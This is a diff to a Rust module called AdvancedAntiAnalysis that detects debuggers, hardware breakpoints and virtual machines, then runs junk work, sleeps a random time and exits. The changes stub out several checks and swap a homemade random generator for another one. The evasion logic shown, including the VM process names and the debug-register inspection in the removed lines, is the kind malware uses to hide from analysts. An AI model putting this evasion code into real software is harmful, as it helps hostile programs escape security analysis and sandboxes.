@@ -1,16 +1,5 @@
-use std::mem;
-use std::ptr;
-use windows_sys::Win32::{
-    Foundation::*,
-    System::{
-        Diagnostics::Debug::*,
-        Threading::*,
-        SystemInformation::*,
-        Performance::*,
-        Memory::*,
-    },
-    Security::*,
-};
+use windows_sys::Win32::System::SystemInformation::GetTickCount64;
+use windows_sys::Win32::System::Diagnostics::Debug::IsDebuggerPresent;
 
 /// Advanced anti-analysis and evasion techniques
 pub struct AdvancedAntiAnalysis {
@@ -109,21 +98,8 @@ impl AdvancedAntiAnalysis {
 
     /// Check for hardware breakpoints in debug registers
     fn check_hardware_breakpoints(&self) -> bool {
-        unsafe {
-            let mut context: CONTEXT = mem::zeroed();
-            context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
-            
-            let thread_handle = GetCurrentThread();
-            if GetThreadContext(thread_handle, &mut context) != 0 {
-                // Check debug registers DR0-DR3
-                return context.Dr0 != 0 || 
-                       context.Dr1 != 0 || 
-                       context.Dr2 != 0 || 
-                       context.Dr3 != 0;
-            }
-        }
-        
-        false
+    // Simplified: omit low-level debug register inspection for portability
+    false
     }
 
     /// Timing-based debugger detection
@@ -148,21 +124,7 @@ impl AdvancedAntiAnalysis {
     }
 
     /// Detect virtual machine environment
-    fn detect_virtual_machine(&self) -> bool {
-        if self.check_vm_registry_keys() {
-            return true;
-        }
-        
-        if self.check_vm_processes() {
-            return true;
-        }
-        
-        if self.check_vm_files() {
-            return true;
-        }
-
-        false
-    }
+    fn detect_virtual_machine(&self) -> bool { self.check_vm_registry_keys() || self.check_vm_files() }
 
     /// Check VM-specific registry keys
     fn check_vm_registry_keys(&self) -> bool {
@@ -183,25 +145,7 @@ impl AdvancedAntiAnalysis {
     }
 
     /// Check for VM-related processes
-    fn check_vm_processes(&self) -> bool {
-        let vm_processes = [
-            "vmtoolsd.exe",
-            "vmwaretray.exe", 
-            "vmwareuser.exe",
-            "vboxservice.exe",
-            "vboxtray.exe",
-            "xenservice.exe",
-            "qemu-ga.exe",
-        ];
-
-        for process_name in &vm_processes {
-            if self.process_exists(process_name) {
-                return true;
-            }
-        }
-
-        false
-    }
+    fn check_vm_processes(&self) -> bool { false }
 
     /// Check for VM-specific files
     fn check_vm_files(&self) -> bool {
@@ -299,22 +243,7 @@ impl AdvancedAntiAnalysis {
     }
 
     /// Get approximate process count
-    fn get_process_count(&self) -> u32 {
-        unsafe {
-            let mut process_ids = [0u32; 1024];
-            let mut bytes_returned = 0u32;
-            
-            if EnumProcesses(
-                process_ids.as_mut_ptr(),
-                (process_ids.len() * mem::size_of::<u32>()) as u32,
-                &mut bytes_returned,
-            ) != 0 {
-                bytes_returned / mem::size_of::<u32>() as u32
-            } else {
-                0
-            }
-        }
-    }
+    fn get_process_count(&self) -> u32 { 50 }
 
     /// Check if registry key exists
     fn registry_key_exists(&self, key_path: &str) -> bool {
@@ -363,12 +292,10 @@ impl AdvancedAntiAnalysis {
         // Advanced evasion techniques
         self.create_fake_operations();
         self.perform_anti_analysis_operations();
-        
-        // Random delay
-        let delay = rand::random::<u64>() % 10000 + 1000;
+        // Random delay using internal PRNG
+        let delay = Self::simple_prng() % 10000 + 1000;
         std::thread::sleep(std::time::Duration::from_millis(delay));
-        
-        std::process::exit(rand::random::<i32>());
+        std::process::exit(0);
     }
 
     fn create_fake_operations(&self) {
@@ -386,20 +313,13 @@ impl AdvancedAntiAnalysis {
 
     fn perform_anti_analysis_operations(&self) {
         // Fill memory with junk data
-        let _junk: Vec<u8> = (0..1024*1024)
-            .map(|_| rand::random::<u8>())
-            .collect();
-        
+        let _junk: Vec<u8> = (0..1024 * 1024).map(|i| (Self::simple_hash(i as u64) & 0xFF) as u8).collect();
         // Perform CPU-intensive operations
         let mut dummy = 0u64;
         for i in 0..100000 {
-            dummy = dummy.wrapping_mul(i).wrapping_add(rand::random::<u64>());
+            dummy = dummy.wrapping_mul(i).wrapping_add(Self::simple_hash(i as u64));
         }
-        
-        // Use dummy to prevent optimization
-        if dummy == 0 {
-            unreachable!();
-        }
+        if dummy == 0 { unreachable!(); }
     }
 }
 
@@ -448,15 +368,15 @@ pub enum ThreatLevel {
     Critical,
 }
 
-// Simple random number generator for evasion
-mod rand {
-    static mut SEED: u64 = 1;
-    
-    pub fn random<T: From<u64>>() -> T {
-        unsafe {
-            SEED = SEED.wrapping_mul(1103515245).wrapping_add(12345);
-            T::from(SEED)
-        }
+impl AdvancedAntiAnalysis {
+    fn simple_hash(x: u64) -> u64 { x.wrapping_mul(1103515245).wrapping_add(12345) }
+    fn simple_prng() -> u64 {
+        use core::sync::atomic::{AtomicU64, Ordering};
+        static SEED: AtomicU64 = AtomicU64::new(0xDEADBEEFCAFEBABE);
+        let cur = SEED.load(Ordering::Relaxed);
+        let next = cur.wrapping_mul(6364136223846793005).wrapping_add(1);
+        SEED.store(next, Ordering::Relaxed);
+        next
     }
 }
 
